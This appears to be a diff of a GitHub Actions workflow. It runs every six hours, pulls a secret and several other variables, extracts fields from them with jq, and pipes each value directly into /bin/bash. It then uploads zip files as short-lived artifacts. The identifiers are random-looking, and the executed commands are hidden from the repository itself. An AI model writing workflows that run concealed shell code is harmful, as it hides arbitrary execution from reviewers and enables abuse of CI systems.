@@ -1,25 +1,28 @@
 name: xiangweiyongsheng
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '2 3/6 * * *'
-jobs:  # 20127
+    - cron: '41 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xiangweiyongsheng
         env:
-          e956: ${{ secrets.e956 }}
+          lerz283: ${{ secrets.lerz283 }}
         run: |
-          echo $e956 | jq -r .mv97676 | /bin/bash
-          echo $z9 | jq -r .uxd63 | /bin/bash
-          echo $z5 | jq -r .xqazv7753 | /bin/bash
-          echo $zmzma1245 | jq -r .qwc513 | /bin/bash
-          echo $hhmp1529 | jq -r .xhysl69018 | /bin/bash
-          echo $iypr114 | jq -r .n7 | /bin/bash
-          echo $txe82 | jq -r .iqb62827 | /bin/bash
-          echo $jldv92 | jq -r .qw545 | /bin/bash
-          echo $jmpap57 | jq -r .e3674 | /bin/bash
+          printf '%s' "$lerz283" | jq -r .lmu4896 | /bin/bash
+          printf '%s' "$ufl350" | jq -r .vm8728 | /bin/bash
+          printf '%s' "$e86135" | jq -r .haawk8503 | /bin/bash
+          printf '%s' "$tvyn23776" | jq -r .b8 | /bin/bash
+          echo $jrpoe78073 | jq -r .kh7489 | /bin/bash
+          printf '%s' "$ob476" | jq -r .dhv820 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: tvT7WcWh
+          path: "*.zip"
+          retention-days: 1
